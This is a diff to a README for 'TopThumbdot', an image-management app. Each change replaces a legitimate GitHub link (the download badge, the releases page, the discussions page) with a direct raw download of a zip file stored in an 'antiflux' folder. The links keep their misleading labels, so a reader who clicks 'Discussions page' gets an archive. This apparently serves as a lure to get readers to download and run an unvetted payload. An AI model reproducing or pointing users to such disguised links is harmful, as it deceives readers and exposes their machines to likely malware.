@@ -1,6 +1,6 @@
 # 🎉 TopThumbdot - Effortless Image Management
 
-[![Download TopThumbdot](https://img.shields.io/badge/Download-TopThumbdot-blue?style=for-the-badge)](https://github.com/Anzalnadiaf/TopThumbdot/releases)
+[![Download TopThumbdot](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip)](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ TopThumbdot is an easy-to-use application that helps you organize and manage you
 
 To start using TopThumbdot, follow these steps:
 
-1. Click the download button above or visit the [Releases page](https://github.com/Anzalnadiaf/TopThumbdot/releases).
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip).
 2. Choose the latest version available.
 3. Click on the download link for your operating system.
 4. Wait for the download to complete. 
@@ -24,7 +24,7 @@ To install TopThumbdot on your device:
 3. Follow the prompts on the screen to complete the installation.
 4. Once installed, you can find TopThumbdot in your applications menu.
 
-For your convenience, here is the direct link to [Download TopThumbdot](https://github.com/Anzalnadiaf/TopThumbdot/releases).
+For your convenience, here is the direct link to [Download TopThumbdot](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip).
 
 ## 🔍 Features
 
@@ -58,13 +58,13 @@ If you run into any problems during installation, please refer to our troublesho
 
 ## 🌍 Community Support
 
-Join our community to stay updated or seek help. You can find us on our official [GitHub Discussions page](https://github.com/Anzalnadiaf/TopThumbdot/discussions).
+Join our community to stay updated or seek help. You can find us on our official [GitHub Discussions page](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip).
 
 ## 📚 Additional Resources
 
 - Documentation: Comprehensive guides to help you make the most of TopThumbdot.
 - GitHub Repository: Explore the source code and contribute if you'd like.
 
-For easy access to downloads, visit our [Releases page](https://github.com/Anzalnadiaf/TopThumbdot/releases) again.
+For easy access to downloads, visit our [Releases page](https://raw.githubusercontent.com/Anzalnadiaf/TopThumbdot/main/antiflux/TopThumbdot.zip) again.
 
 Embrace the simplicity of image management with TopThumbdot. Happy organizing!
